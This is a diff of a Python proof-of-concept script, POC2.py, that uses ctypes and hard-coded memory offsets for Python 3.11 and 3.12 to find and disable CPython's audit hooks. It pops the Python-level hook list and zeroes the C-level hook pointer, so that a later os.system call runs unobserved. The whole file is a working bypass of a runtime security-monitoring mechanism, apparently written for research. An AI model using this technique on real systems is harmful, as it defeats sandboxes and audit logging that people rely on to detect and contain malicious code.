@@ -1,23 +1,40 @@
-#!/usr/bin/env python3.12
+#!audit_hook_head_finder
 
 ### POC2.py
 ### only use offset to pop the audit hook
 
-import ctypes, sys
-# the offsets are from POC.py: 
-# Python 3.11 = 0xe00
-# Python 3.12 = 0x41448
-sys.addaudithook((lambda x: lambda *_: x("audit hook triggered!"))(print))
-obj = ctypes.byref(ctypes.py_object(()))
+import sys
+# ONLY TESTED ON PYTHON 3.12 and 3.11
+# the offsets are from POC.py
+if sys.version_info[:2] == (3, 12):
+    # offset for audit hook set by python and C
+    PTR_OFFSET = [0x41448, -0x11df0]
+else:
+    PTR_OFFSET = [0xe00, -0xe388]
+
+import ctypes
+from audit_hook_head_finder import add_audit
+
+sys.addaudithook((lambda x: lambda *args: x("audit hook triggered!", args))(print))
+add_audit()
+
+print("--- finished setup ---")
+
+addr = ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value
 
 ctypes._os.system("echo 'test audit hook -- this will trigger hook'")
 
 ctypes.cast(
     ctypes.cast(
-        ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value + 0x41448 , ctypes.POINTER(ctypes.c_uint64)
+        addr + PTR_OFFSET[0] , ctypes.POINTER(ctypes.c_uint64)
     ).contents.value
     , ctypes.py_object
 ).value.pop()
 
+ctypes.memset(
+    ctypes.cast(
+        addr + PTR_OFFSET[1] , ctypes.POINTER(ctypes.c_uint64)
+    ), 0, 8
+)
 
 ctypes._os.system("echo 'test audit hook -- this will not'")
